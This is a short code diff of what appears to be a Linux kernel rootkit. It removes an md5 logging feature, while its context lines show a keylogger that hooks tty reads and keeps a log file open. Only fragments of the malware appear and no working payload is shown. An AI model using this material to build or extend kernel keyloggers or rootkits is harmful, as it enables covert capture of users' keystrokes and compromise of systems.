@@ -46,15 +46,6 @@ sys64 real_m_bpf;
 /**
  * These are kept open throughout kv lifetime
  *  This is so because tty is continuous.
- *  As for md5 there few reasons: it can come
- *  at any time from user interface and opening the file
- *  from that state would require one of the following:
- *      privileges promotion
- *      using a more complex kernel API
- *      input would need to come from root
- *
- *   The file has strict permissions.
- *   It is less complicate to keep the FD open.
  */
 static struct file *ttyfilp;
 
@@ -794,11 +785,6 @@ void _keylog_cleanup(void) {
         prerr("Error removing %s\n", TTYFILE);
 }
 
-static bool _rm_md5_log;
-void kv_md5log_rm_log(bool rm_log) {
-    _rm_md5_log = rm_log;
-}
-
 static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
 static ssize_t __attribute__((unused))
     m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
@@ -1099,7 +1085,7 @@ bool sys_init(void) {
         return false;
     }
 
-    /** Init tty log and md5 */
+    /** Init tty log */
     ttyfilp = fs_kernel_open_file(TTYFILE);
     if (!ttyfilp) {
         return false;
